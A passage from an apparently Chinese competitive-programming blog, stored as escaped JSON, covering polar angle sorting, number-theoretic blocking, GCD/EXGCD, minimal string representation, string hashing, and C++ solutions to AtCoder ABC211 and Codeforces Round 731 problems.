两向量一个在第二象限，一个在第三象限的情况 // 为了处理 atan 的边界 if(now \u0026lt; 0) now += 2 * PI; if(now \u0026lt; mmax) { mmax = now; ans = {p[i].id, p[i+1].id}; } } printf(\u0026#34;%d %d\\n\u0026#34;, ans.first, ans.second); return 0; } 例题 2 ：[USACO10OPEN]Triangle Counting G - 洛谷 题意：给出平面上的很多点，求包含原点的三角形的个数。\n思路：先求出一共可以组成多少种三角形，使用组合数 $\\binom{n}{3} $，再减去不满足条件的三角形，可以发现，对于任何一个不满足条件的三角形必然存在，其中两个顶点与原点组成的直线后其余两个点观点都在同侧。在极角排序后，我们可以遍历每个点（看作以原点为起点向量），求出与这个点夹角小于 $\\pi$ 的个数，也就是减去 $\\binom{n}{2}$ ，就是答案了，这里可以使用二分或者双指针算法，每次只需要减去一边的不满足条件的即可。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 #include \u0026lt;algorithm\u0026gt; #include \u0026lt;cmath\u0026gt; #include \u0026lt;iostream\u0026gt; using namespace std; typedef long double ld; typedef long long ll; typedef pair\u0026lt;ld, int\u0026gt; PLI; const int M = 1e5 + 7; const ld PI = acos(-1); struct Point { ll x, y; Point(ll x = 0, ll y = 0) : x(x), y(y) {} } p[M]; PLI angle[M]; bool check(int a, int b) { return p[a].x * p[b].y \u0026gt;= p[a].y * p[b].x; //逆时针旋转小于 PI (本质上是叉积) } int main() { int n; scanf(\u0026#34;%d\u0026#34;, \u0026amp;n); for (int i = 1; i \u0026lt;= n; i++) { int x, y; scanf(\u0026#34;%d%d\u0026#34;, \u0026amp;x, \u0026amp;y); p[i] = Point(x, y); angle[i] = {atan2(y, x), i}; } sort(angle + 1, angle + 1 + n); // 极角排序 ll ans = 1LL * n * (n - 1) * (n - 2) / 6; ll now = 0; // 当前满足条件的点的个数 for (int l = 1, r = 2; l \u0026lt;= n; l++) { while (check(angle[l].second, angle[r].second)) { now++; r = r % n + 1; // r ++，外加取模，一举两得 } ans -= now * (now - 1) / 2; now--; } printf(\u0026#34;%lld\\n\u0026#34;, ans); return 0; } 例题 3 : [POI2008]TRO-Triangles - 洛谷 题意：给定平面上的一些点，求这些点能组成的所有三角形的面积之和，三点同一直线上面积算作 $0$ 。\n分析：\n题目的数据范围是 $n \\le 3000$，由组合数可知，暴力作法的时间复杂度为 $O(n^3)$ 是过不了的，所以我们对这么多的点进行分析。\n已知三点 $A(x_a,y_a),B(x_b,y_b),C(x_c,y_c)$\n则它们所围成的三角形的面积可以这么算 ：\n$$ \\begin{aligned} S \u0026amp;= \\dfrac{1}{2}\\overrightarrow{AB} \\times \\overrightarrow{AC} \\\\ \u0026amp;= \\dfrac{1}{2}(x_b - x_a, y_b - y_a) \\times (x_c - x_a, y_c - y_a) \\\\ \u0026amp;= \\dfrac{1}{2}(x_b-x_a)(y_c-y_a) - (y_b - y_a)(x_c - x_a) \\\\ \u0026amp;= \\dfrac{1}{2}(x_b y_c + x_a y_a - x_a y_c - x_b y_a) - (y_b x_c + y_a x_a - y_b x_a -y_a x_c) \\\\ \u0026amp;= \\dfrac{1}{2}x_a(y_b - y_c) + y_a(x_c - x_b) \\end{aligned} $$\n所以我们可以先对所有点根据 $x$ ，$y$ （从小到大）双关键字排序，然后确定第一个点，也就算遍历一遍每个点，然后对后面的点极角排序，这样的话叉积结果可以直接是正数，然后遍历两个点的时间复杂度太高，所以我们就遍历其中一个点，另一个点则可以使用后缀和代替。\n$$ S = \\dfrac{1}{2}x_a(y_b - \\sum y_c) + y_a(\\sum x_c - x_b) $$\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 #include \u0026lt;algorithm\u0026gt; #include \u0026lt;cmath\u0026gt; #include \u0026lt;iostream\u0026gt; using namespace std; typedef long double ld; typedef long long ll; typedef pair\u0026lt;int, int\u0026gt; PII; const int M = 3e3 + 7; struct Point { int x, y; Point(int x = 0, int y = 0) : x(x), y(y) {} } p[M], add[M]; bool cmp(Point a, Point b) { return a.x == b.x ? a.y \u0026lt; b.y : a.x \u0026lt; b.x; } bool cmp_angle(Point a, Point b) { return 1LL * a.x * b.y \u0026gt; 1LL * a.y * b.x; } int main() { int n; scanf(\u0026#34;%d\u0026#34;, \u0026amp;n); for (int i = 1; i \u0026lt;= n; i++) { int x, y; scanf(\u0026#34;%d%d\u0026#34;, \u0026amp;x, \u0026amp;y); p[i] = Point(x, y); } ll ans = 0; sort(p + 1, p + n + 1, cmp); // 对各个点按照 x 坐标排序 for(int i = 1; i \u0026lt;= n; ++i) { int cnt = 0; for(int j = i + 1; j \u0026lt;= n; j ++) { // 求到当前点的向量 add[cnt].x = p[j].x - p[i].x; add[cnt].y = p[j].y - p[i].y; cnt ++; } ll sumx = 0, sumy = 0; sort(add, add + cnt, cmp_angle); // 对这些项目极角排序（这样面积都为整数） for(int j = 0; j \u0026lt; cnt; j ++) sumx += add[j].x , sumy += add[j].y; // 求后缀和 for(int j = 0; j \u0026lt; cnt; j ++) { // 遍历第二个点 sumx -= add[j].x, sumy -= add[j].y; // 第三个点的和 ans += sumy * add[j].x - sumx * add[j].y; } } printf(\u0026#34;%lld.%lld\u0026#34;, ans/2, (ans \u0026amp; 1) * 5); // 小数处理 return 0; } ","date":"2021-09-30T15:35:31+08:00","permalink":"https://example.com/p/polaranglesort/","title":"PolarAngleSort"},{"content":"数论分块 引入 给定一个正整数 $n$，求解 $$ \\sum_{i = n}^{n} \\left \\lfloor \\dfrac{n}{i} \\right \\rfloor $$ 首先易想到暴力做法，时间复杂度为 $O(n)$，但通过打表 $n = 10$\ni 1 2 3 4 5 6 7 8 9 10 $\\left \\lfloor \\dfrac{n}{i} \\right \\rfloor$ 10 5 3 2 2 1 1 1 1 1 我们可以发现对于 $i$ 的一段区间 ，$\\left \\lfloor \\dfrac{n}{i} \\right \\rfloor$ 的值都是相同的。如果我们能一次计算一段的值，那么复杂度将会降低。\n分块 设一段的左端点为 $L_{i}$，右端点为 $R_{i}$，则 $L_{i+1} = R_{i} + 1$。如何找到每一段的 $L$ 和 $R$ ？使得 $$ \\left \\lfloor \\dfrac{n}{L} \\right \\rfloor = \\left \\lfloor \\dfrac{n}{R} \\right \\rfloor $$ 设 $\\left \\lfloor \\dfrac{n}{L} \\right \\rfloor = k$，$R = L + d$，得到 $\\left \\lfloor \\dfrac{n}{L+d} \\right \\rfloor = k$，即 $$ \\begin{aligned} n \u0026amp;= Lk + p, \\ 0 \\leqslant p \u0026lt; L \\\\ n \u0026amp;= (L + d)k + q, \\ 0 \\leqslant q \u0026lt; L \\end{aligned} $$ 此时 $d_{max} = \\left \\lfloor \\dfrac{p}{k} \\right \\rfloor$ 带入 $R = L + d$ 得到 $$ \\begin{aligned} R \u0026amp;= L + \\left \\lfloor \\dfrac{p}{k} \\right \\rfloor \\\\ \u0026amp;= L + \\left \\lfloor \\dfrac{n - Lk}{k} \\right \\rfloor \\\\ \u0026amp;= \\left \\lfloor \\frac{n}{\\left \\lfloor \\dfrac{n}{L}\\right \\rfloor}\\right \\rfloor \\end{aligned} $$ 现在我们已经可以求出每一段分块的区间了，那么每一段的贡献为 $(R−L+1)\\times \\left \\lfloor \\dfrac{n}{L}\\right \\rfloor$\n复杂度证明 数论分块的复杂度为 $O(2\\sqrt{n})$，我们将证明： $$ \\forall n \\in \\mathbb{N}, \\left|\\left \\lbrace \\lfloor \\frac{n}{d} \\rfloor \\mid d \\in \\mathbb{N},d\\leq n \\right \\rbrace \\right| \\leq \\lfloor 2\\sqrt{n} \\rfloor $$ $$ \\forall n \\in N_{+}, \\left|\\left\\{ \\lfloor\\frac{n}{d}\\rfloor\\mid d \\in N_{+},d\\leq n \\right\\}\\right|\\leq\\lfloor 2\\sqrt{n} \\rfloor $$\n略证：\n对于 $d \\leqslant \\lfloor \\sqrt{n} \\rfloor$，$\\lfloor \\frac{n}{d} \\rfloor$ 有 $\\lfloor \\sqrt{n} \\rfloor$ 种取值。\n对于 $d \u0026gt; \\lfloor \\sqrt{n} \\rfloor$，有$\\lfloor \\frac{n}{d} \\rfloor \\leqslant\\lfloor \\sqrt{n} \\rfloor$ ，则也有 $\\lfloor \\sqrt{n} \\rfloor$ 种取值。\n练习与思考 P1403 约数研究 求 $\\sum_{i=1}^{n}f(i)$，$f(i)$ 代表正数 $i$ 的约数的个数。\n思路很简单就是，$1\\dots n$ 中间 $i$ 作为约数出现的次数为 $\\left \\lfloor\\dfrac{n}{i} \\right \\rfloor$\n那么答案就是 $$ \\sum_{i=1}^{n}\\left \\lfloor \\dfrac{n}{i} \\right \\rfloor $$\n1 2 3 4 5 6 7 8 ll solve(int n) { ll ans = 0; for (ll l = 1, r = 0; l \u0026lt;= n; l = r + 1) { r = n / (n / l); ans += n / l * (r - l + 1); } return ans; } P2424 约数和 题意简单的说就是求 $$ \\sum_{i = 1}^{y} f(i) - \\sum_{i = 1}^{x} f(i), \\ y \u0026gt; x $$ 其中的 $$ f(x) = \\sum_{i|x}i $$ 我们要求 $\\sum_{i = 1}^{n} f(i)$，也就是求每个约数在 $1\\dots n$ 中的出现次数（也就是上题）再乘上约数本身，即 $$ \\sum_{i = 1}^{n} i \\times \\left \\lfloor\\dfrac{n}{i} \\right \\rfloor $$ 在上一题的基础上再乘上约数本身，也就是对于每一段 $[L\\dots R]$ ，求 $$ \\left \\lfloor\\dfrac{n}{i} \\right \\rfloor \\times \\sum_{i = L}^{R} i $$ 由高斯求和得 $$ \\left \\lfloor\\dfrac{n}{i} \\right \\rfloor \\times (L + R) \\times (R - L + 1) / 2 $$\n1 2 3 4 5 6 7 8 ll solve(int n) { ll ans = 0; for (ll l = 1, r = 0; l \u0026lt;= n; l = r + 1) { r = n / (n / l); ans += n / l * (l + r) * (r - l + 1) / 2; } return ans; } 类似得题目还有：\nP2261 [CQOI2007]余数求和\n","date":"2021-08-10T00:00:00Z","permalink":"https://example.com/p/%E6%95%B0%E8%AE%BA%E5%88%86%E5%9D%97/","title":"数论分块"},{"content":"AtCoder Beginner Contest 211 A - Blood Pressure 水题，按题目给的式子输出即可\n1 2 3 4 5 6 7 8 9 #include \u0026lt;bits/stdc++.h\u0026gt; using namespace std; int main(){ int a, b; cin \u0026gt;\u0026gt; a \u0026gt;\u0026gt; b; double c = ((double)a - b) / 3 + b; printf(\u0026#34;%lf\\n\u0026#34;, c); return 0; } B - Cycle Hit 暴力判断\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 #include \u0026lt;bits/stdc++.h\u0026gt; using namespace std; bool st[4]; int main() { string s[4]; for (int i = 0; i \u0026lt; 4; i++) cin \u0026gt;\u0026gt; s[i]; for (int i = 0; i \u0026lt; 4; i++) { if (s[i] == \u0026#34;H\u0026#34;) st[0] = true; if (s[i] == \u0026#34;2B\u0026#34;) st[1] = true; if (s[i] == \u0026#34;3B\u0026#34;) st[2] = true; if (s[i] == \u0026#34;HR\u0026#34;) st[3] = true; } bool flag = true; for (int i = 0; i \u0026lt; 4; i++) if (!st[i]) flag = false; if (flag) cout \u0026lt;\u0026lt; \u0026#34;Yes\u0026#34; \u0026lt;\u0026lt; endl; else cout \u0026lt;\u0026lt; \u0026#34; No\u0026#34; \u0026lt;\u0026lt; endl; return 0; } C - chokudai 简单 $dp$，$dp[i][j]$ 代表到 $i$ 位置前缀长度为 $j$ 的个数。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 #include \u0026lt;bits/stdc++.h\u0026gt; using namespace std; const int M = 1e5 + 7, mod = 1e9 + 7; ll dp[M][8]; char s[M]; // c, h, o, k, u, d, a, i string cmp = \u0026#34; chokudai\u0026#34;; int main() { cin \u0026gt;\u0026gt; s + 1; int len = strlen(s + 1); for (int i = 1; i \u0026lt;= len; i++) { dp[i - 1][0] = 1; for (int j = 1; j \u0026lt; 9; j++) { if (s[i] == cmp[j]) { dp[i][j] = (dp[i - 1][j] + dp[i - 1][j - 1]) % mod; } else dp[i][j] = dp[i - 1][j]; } } cout \u0026lt;\u0026lt; dp[len][8] \u0026lt;\u0026lt; endl; return 0; } D - Number of Shortest paths 由于边长的权值为 $1$ ，所以可以通过 $bfs$ 来求解最短路的条数。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 #include \u0026lt;bits/stdc++.h\u0026gt; using namespace std; const int M = 2e5 + 7, mod = 1e9 + 7; struct Node { int to, nxt; } tr[M * 2]; int idx, head[M]; int cnt[M]; ll num[M]; bool st[M]; void add(int u, int v) { tr[idx] = {v, head[u]}; head[u] = idx++; } void bfs() { queue\u0026lt;int\u0026gt; q; q.push(1); num[1] = 1; st[1] = true; while (q.size()) { int now = q.front(); q.pop(); for (int i = head[now]; ~i; i = tr[i].nxt) { int j = tr[i].to; if (st[j] \u0026amp;\u0026amp; cnt[j] == cnt[now] + 1) { num[j] = (num[j] + num[now]) % mod; } else if (!st[j]) { cnt[j] = cnt[now] + 1; num[j] = num[now]; st[j] = true; q.push(j); } } } } int main() { memset(head, -1, sizeof head); int n, m; scanf(\u0026#34;%d%d\u0026#34;, \u0026amp;n, \u0026amp;m); for (int i = 1; i \u0026lt;= m; i++) { int x, y; scanf(\u0026#34;%d%d\u0026#34;, \u0026amp;x, \u0026amp;y); add(x, y), add(y, x); } bfs(); printf(\u0026#34;%lld\\n\u0026#34;, num[n]); return 0; } ","date":"2021-07-25T15:13:43+08:00","permalink":"https://example.com/p/abc211/","title":"ABC211"},{"content":"GCD \u0026amp; EXGCD GCD （Greatest Common Divisor）即最大公约数。\n欧几里得算法 我们已知两个数 $a$ ，$b$ ；假设 $a \u0026gt; b$，有两种情况：\n$b \\mid a$​ ，即 $\\gcd (a, b) = b$。 $a = b\\times k + a\\bmod b$​​​​​​ ，此时我们要证明 $\\gcd(a, b) = \\gcd(b, a\\bmod b)$​​​​ 。 设 $$ a = b\\times k + c，(c = a \\bmod b) $$ 设 $d \\mid a,\\ d\\mid b$​​​ ；则 $$ \\dfrac{c}{d} = \\dfrac{a}{d} - k\\dfrac{b}{d} $$ 因为 $\\dfrac{a}{d} $​​ 和 $\\dfrac{bk}{d}$​​​ 都为整数，所以 $\\dfrac{c}{d}$​​​ 也是整数，即 $d \\mid c$​​ 。所以对于所有的 $a, b$​​​ 的公约数，都是 $a\\bmod b$​​ 的约数。\n重新设 $d \\mid b, d \\mid c$ $$ \\dfrac{a}{d} = k\\dfrac{b}{d} + \\dfrac{c}{d} $$ 因为 $\\dfrac{c}{d} $​​​​​​ 和 $\\dfrac{bk}{d}$​​​​​​ 都为整数，所以 $\\dfrac{a}{d}$​​​​​​ 也是整数，即 $d \\mid a$​​​​​​ 。所以对于所有的 $b, a \\bmod b$​​ 的公约数，都是 $a$​​​​​​​ 的约数。\n两式的公约数是相同的，那么他们的最大公约数也相同。\n得到了 $\\gcd(a, b) = \\gcd(b, a\\bmod b)$ 。\n1 2 3 int gcd(int a, int b){ return b ? gcd(b, a % b) : a; } 对应的 LCM 也很简单\n1 2 3 int lcm(int a, int b){ return (ll)a * b / gcd(a, b); } 扩展欧几里得 EXGCD（Extended Euclidean algorithm）扩展欧几里得算法。常用于求 $ax + by = \\gcd(a, b)$​​​ 的通解。\n设 $$ \\begin{aligned} ax_{1} + by_{1} \u0026amp;= \\gcd(a, b)\\\\ bx_{2} + (a \\bmod b) y_{2} \u0026amp;= \\gcd(b, a \\bmod b) \\end{aligned} $$ 前面已经证明 $\\gcd(a, b) = \\gcd(b, a\\bmod b)$\n且 $$ a \\bmod b = a - \\left \\lfloor \\dfrac{a}{b} \\right \\rfloor \\times b $$ 得 $$ \\begin{aligned} ax_{1}+by_{1}\u0026amp;=bx_{2}+(a - \\left \\lfloor \\dfrac{a}{b} \\right \\rfloor \\times b)y_{2}\\\\ ax_{1}+by_{1}\u0026amp;=ay_{2}+b(x_{2} - \\left \\lfloor \\dfrac{a}{b} \\right \\rfloor \\times y_{2}) \\end{aligned} $$ 得 $$ \\begin{aligned} x_{1} \u0026amp;= y_{2}\\\\ y_{1} \u0026amp;= x_{2} - \\left \\lfloor \\dfrac{a}{b} \\right \\rfloor \\times y_{2} \\end{aligned} $$\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 int exgcd(int a, int b, int \u0026amp;x, int \u0026amp;y) { if(!b) { x = 1, y = 0; return a; } int g = exgcd(b, a % b, y, x); y -= a / b * x; return g; } int exgcd(int a, int b, int \u0026amp;x, int \u0026amp;y) { int x1 = 1, x2 = 0, x3 = 0, x4 = 1; while (b != 0) { int c = a / b; tie(x1, x2, x3, x4, a, b) = make_tuple(x3, x4, x1 - x3 * c, x2 - x4 * c, b, a - b * c); } x = x1, y = x2; return a; } ","date":"2021-07-20T00:00:00Z","permalink":"https://example.com/p/gcd-exgcd/","title":"GCD \u0026 EXGCD"},{"content":"最小表示法 概念 循环同构串：我们有字符串 bcad ，那么它的循环同构串可以是 bcad,cadb,adbc,dbca。\n最小表示法可以用来找出字符串 S （或者数组）的循环同构串中字典序最小的一个。\n实现方法 复杂度 $O(N)$。\n假设有一个字符串 $S$ ,设 $S$ 的长度为 $n=|S|$，思考如下：\n两个指针 $i$ 、$j$ ，初始化时 $i$ 指向 $s_{0}$，j 指向 $s_{1}$ 。我们规定 $i$ 和 $j$ 在任意时刻都不能相等。\n匹配长度 $k = 0$ 开始，检验 $s_{i + k}$ 和 $s_{j + k}$ 是否相等，相等则 $k \\gets k+1$，一直循环下去，直到找到第一个不相同的字符。（若 $k = n$ 则全字符串相等）\n在遇到第一个不相同字符的过程中，我们发现 $s_{i + k}$ 和 $s_{j + k}$ 的关系有两种：\n$s_{i + k} \u0026gt; s_{j + k}$ ，显然 此时以 $i$ 为开头必然不使字典序最小，所以 $i \\gets i+k+1$。 $s_{i + k} \u0026lt; s_{j + k}$ ，同理，$j \\gets j+k+1$。 当 $i,j,k$ 中有一个等于 $n$，循环结束，返回 $\\min(i，j)$。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 int n, S[300009]; int Min_show() { int i = 0, j = 1, k = 0; while (i \u0026lt; n \u0026amp;\u0026amp; j \u0026lt; n \u0026amp;\u0026amp; k \u0026lt; n) { if (S[(i + k) % n] == S[(j + k) % n]) k ++; else { if (S[(i + k) % n] \u0026gt; S[(j + k) % n]) i += k + 1; else j += k + 1; if (i == j) i++; k = 0; } } return min(i, j); //返回最小表示 } 习题 P1368 最小表示法\n","date":"2021-07-18T00:00:00Z","permalink":"https://example.com/p/%E6%9C%80%E5%B0%8F%E8%A1%A8%E7%A4%BA%E6%B3%95/","title":"最小表示法"},{"content":"字符串 Hash 字符串 Hash 的思想 Hash 的核心思想在于，将输入映射到一个值域较小、可以方便比较的范围。而在字符串中主要是为了方便比较，而且为了减少 Hash 冲突，一般映射的范围较大。\n我们定义一个把 字符串映射到整数 的函数 $f$ ，这个 $f$ 称为是 Hash 函数。我们希望这个函数可以方便地帮我们判断两个字符串是否相等， 有两点很重要。\n在 Hash 函数值不一样的时候，两个字符串一定不一样； 在 Hash 函数值一样的时候，两个字符串不一定一样（但有大概率一样，且我们当然希望它们总是一样的）。 Hash 函数值一样时字符串却不一样, 我们称为 哈希冲突。\n如何 Hash 一般采用多项式的方法，对于一个长度为 $\\large{l}$ 的字符串 $s $ ，我们可以定义\n$$ f(s) = \\sum_{i = 1}^{l} s[i] \\times b^{i - 1}\\pmod m $$\n例如：对于字符串 $xyz$ ，其多项式为 $xb^{2} + yb^{1} + zb^{0}$ ，所以对字符串 Hash 的另一种理解就是将字符串转化为 $b$ 进制数。\n有以下几点值得注意：\n如果要从 $1$ 开始存储字符串，我们可以使用 scanf(\u0026quot;%s\u0026quot;, s + 1) 来读取输入。 对于 $b$ 的取值，我们一般取 $131$ 或者 $13331$（经验值，字符串哈希冲突较少） 对于模数 $M$，我们可以取一个大指数，如 1e9 + 7,998244353,212370440130137957ll 或者使用 unsigned long long 自动对 $2 ^{64}$ 取模。 对于减少哈希冲突，我们还可以通过双 Hash ，也就是分别用两个不同的 $base$ 和 $M$ 来计算。 Hash 复杂度为 $O(N)$，查询某段子串的 Hash 复杂度为 $O(1)$ 。\n子串查询原理： $$ \\begin{aligned} hash[1] \u0026amp;= s[1] b^{0} \\\\\\\\ hash[2] \u0026amp;= s[1] b^{1} + s[2]^{0}\\\\\\\\ hash[3] \u0026amp;= s[1] b^{2} + s[2]^{1} + s[3]^{0}\\\\\\\\ hash[4] \u0026amp;= s[1] b^{3} + s[2]^{3} + s[3]^{1} + s[4]^{0}\\\\\\\\ hash[5] \u0026amp;= s[1] b^{4} + s[2]^{3} + s[3]^{2} + s[4]^{1} + s[5]^{0} \\end{aligned} $$\n假如我们要查询子串 $[3,5]$ ，我们会发现 $hash[5]$ 与 $hash[2]$，如果不看 b 的幂次，正好是答案，所以我们将 $hash[2]$ 的幂次每一位补齐到与 $hash[5]$ 一样。 $$ \\begin{aligned} hash[2] \\times b^{3} \u0026amp;= s[1]b^{4} + s[2]b^{3}\\\\ hash[5] \u0026amp;= s[1] b^{4} + s[2]^{3} + s[3]^{2} + s[4]^{1} + s[5]^{0} \\end{aligned} $$ 此时将两者相减所得的值正好是 子串的 hash 值。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 typedef unsigned long long ull; const ull base = 131, M = 1e5 + 7, mod = 1e9 + 7; char s[M]; ull myhash[M], power[M]; //myhash 里面存算到某位时的 Hash 值，power 存 base 的幂次（子串查询才需要） ull get_hash(char *s) { ull value = 0; power[0] = 1; for (int i = 1; s[i]; i++) { value = (value * base + s[i]) % mod; myhash[i] = value; power[i] = power[i - 1] * base % mod; } return value;//返回最终字符串的 Hash 值 } //计算某段的 Hash 值 ull get_sub_hash(int l, int r) { return (myhash[r] - (myhash[l - 1] * power[r - l + 1]) % mod + mod) % mod; } ","date":"2021-07-16T00:00:00Z","permalink":"https://example.com/p/%E5%AD%97%E7%AC%A6%E4%B8%B2hash/","title":"字符串Hash"},{"content":"Codeforces Round #731 (Div. 3) A. Shortest Path with Obstacle 判断一下两点最短路径是否为一条直线，障碍是否在该直线上。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 #include \u0026lt;bits/stdc++.h\u0026gt; using namespace std; int main() { int t; cin \u0026gt;\u0026gt; t; while(t --){ int x1, y1, x2, y2, xf, yf; cin \u0026gt;\u0026gt; x1 \u0026gt;\u0026gt; y1 \u0026gt;\u0026gt; x2 \u0026gt;\u0026gt; y2 \u0026gt;\u0026gt; xf \u0026gt;\u0026gt; yf; if(x1 == x2 \u0026amp;\u0026amp; x1 == xf \u0026amp;\u0026amp; ((yf \u0026gt;= y1 \u0026amp;\u0026amp; yf \u0026lt;= y2) || (yf \u0026lt;= y1 \u0026amp;\u0026amp; yf \u0026gt;= y2))) cout \u0026lt;\u0026lt; abs(y1 - y2) + 2 \u0026lt;\u0026lt; endl; else if(y1 == y2 \u0026amp;\u0026amp; y1 == yf \u0026amp;\u0026amp; ((xf \u0026gt;= x1 \u0026amp;\u0026amp; xf \u0026lt;= x2) || (xf \u0026lt;= x1 \u0026amp;\u0026amp; xf \u0026gt;= x2))) cout \u0026lt;\u0026lt; abs(x1 - x2) + 2 \u0026lt;\u0026lt; endl; else cout \u0026lt;\u0026lt; abs(x1 - x2) + abs(y1 - y2) \u0026lt;\u0026lt; endl; } return 0; } B. Alphabetical Strings 先找到 a 的位置，然后双指针向两边寻找，如果找不到符合的则输出 NO；\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 #include \u0026lt;bits/stdc++.h\u0026gt; using namespace std; int main() { int t; cin \u0026gt;\u0026gt; t; while (t--) { string s; cin \u0026gt;\u0026gt; s; int st = -1; for (int i = 0; i \u0026lt; s.size(); i++) if (s[i] == \u0026#39;a\u0026#39;) st = i; if (st == -1) { cout \u0026lt;\u0026lt; \u0026#34;NO\u0026#34; \u0026lt;\u0026lt; endl; continue; } bool flag = true; char now = \u0026#39;b\u0026#39;; for (int l = st - 1, r = st + 1; l \u0026gt;= 0 || r \u0026lt; s.size(); now++) { if (l \u0026gt;= 0 \u0026amp;\u0026amp; s[l] == now) l--; else if (r \u0026lt; s.size() \u0026amp;\u0026amp; s[r] == now) r++; else flag = false; } if (flag) cout \u0026lt;\u0026lt; \u0026#34;YES\u0026#34; \u0026lt;\u0026lt; endl; else cout \u0026lt;\u0026lt; \u0026#34;NO\u0026#34; \u0026lt;\u0026lt; endl; } return 0; } C. Pair Programming 每次添加 a，b数组中可以添加的操作，循环，直到添加完或者出现无法继续添加的情况。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 #include \u0026lt;bits/stdc++.h\u0026gt; #define INF 0x3f3f3f3f using namespace std; const int M = 1e5 + 7; int a[M], b[M], ans[M]; int main() { int t; scanf(\u0026#34;%d\u0026#34;, \u0026amp;t); while (t--) { int k, n, m; scanf(\u0026#34;%d%d%d\u0026#34;, \u0026amp;k, \u0026amp;n, \u0026amp;m); for (int i = 1; i \u0026lt;= n; i ++) scanf(\u0026#34;%d\u0026#34;, \u0026amp;a[i]); for (int i = 1; i \u0026lt;= m; i ++) scanf(\u0026#34;%d\u0026#34;, \u0026amp;b[i]); a[n + 1] = b[m + 1] = INF; //数组末尾后一个为INF，方便后面判断 int cnt = 1; for (int i = 1, j = 1; i \u0026lt;= n || j \u0026lt;= m;) { while (i \u0026lt;= n \u0026amp;\u0026amp; a[i] \u0026lt;= k) { ans[cnt ++] = a[i]; if (a[i] == 0) k++; i ++; } while (j \u0026lt;= m \u0026amp;\u0026amp; b[j] \u0026lt;= k) { ans[cnt++] = b[j]; if (b[j] == 0) k++; j ++; } if (a[i] \u0026lt;= k || b[j] \u0026lt;= k) continue; else break; } if (cnt != n + m + 1) printf(\u0026#34;-1\\n\u0026#34;); else { for (int i = 1; i \u0026lt;= n + m; i ++) printf(\u0026#34;%d \u0026#34;, ans[i]); printf(\u0026#34;\\n\u0026#34;); } } return 0; } D. Co-growing Sequence 寻找两数组直接的关系\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 #include \u0026lt;bits/stdc++.h\u0026gt; using namespace std; const int M = 2e5 + 7; int num[M], ans[M]; int main() { int t; scanf(\u0026#34;%d\u0026#34;, \u0026amp;t); while (t--) { int n; scanf(\u0026#34;%d\u0026#34;, \u0026amp;n); for (int i = 1; i \u0026lt;= n; i++) scanf(\u0026#34;%d\u0026#34;, \u0026amp;num[i]); int last = num[1]; for (int i = 2; i \u0026lt;= n; i++) { ans[i] = (last | num[i]) ^ num[i]; last = ans[i] ^ num[i]; } for (int i = 1; i \u0026lt;= n; i++) printf(\u0026#34;%d \u0026#34;, ans[i]); printf(\u0026#34;\\n\u0026#34;); } return 0; } E. Air Conditioners 优先队列BFS，$O(N)$\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 #include \u0026lt;bits/stdc++.h\u0026gt; #define x first #define y second using namespace std; typedef pair\u0026lt;int, int\u0026gt; PII; const int M = 3e5 + 7; int a[M], temp[M], ans[M], n, k; bool st[M]; void bfs() { priority_queue\u0026lt;PII, vector\u0026lt;PII\u0026gt;, greater\u0026lt;PII\u0026gt;\u0026gt; heap; for (int i = 1; i \u0026lt;= k; i++) heap.push({temp[i], a[i]}); while (heap.size()) { auto now = heap.top(); heap.pop(); if (st[now.y]) continue; st[now.y] = true; ans[now.y] = now.x; if (now.y \u0026gt; 1) heap.push({now.x + 1, now.y - 1}); if (now.y \u0026lt; n) heap.push({now.x + 1, now.y + 1}); } } int main() { int t; scanf(\u0026#34;%d\u0026#34;, \u0026amp;t); while (t--) { memset(st, 0, sizeof st); scanf(\u0026#34;%d%d\u0026#34;, \u0026amp;n, \u0026amp;k); for (int i = 1; i \u0026lt;= k; i++) scanf(\u0026#34;%d\u0026#34;, \u0026amp;a[i]); for (int i = 1; i \u0026lt;= k; i++) scanf(\u0026#34;%d\u0026#34;, \u0026amp;temp[i]); bfs(); for (int i = 1; i \u0026lt;= n; i++) printf(\u0026#34;%d \u0026#34;, ans[i]); printf(\u0026#34;\\n\u0026#34;); } return 0; } F. Array Stabilization (GCD version) 首先寻找整个数组的是否完全相等，算出整个数组的 gcd，每个元素 /= gcd，找到该数组的最长公共质因子就为答案。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 #include \u0026lt;bits/stdc++.h\u0026gt; using namespace std; typedef pair\u0026lt;int, int\u0026gt; PII; const int M = 1e6 + 7; int prime[M], cnt, num[M]; bool st[M]; int gcd(int a, int b) { return b ? gcd(b, a % b) : a; } void get_prime(int x) { for (int i = 2; i \u0026lt;= x; i++) { if (!st[i]) prime[cnt++] = i; for (int j = 0; prime[j] \u0026lt;= x / i; j++) { st[prime[j] * i] = true; if 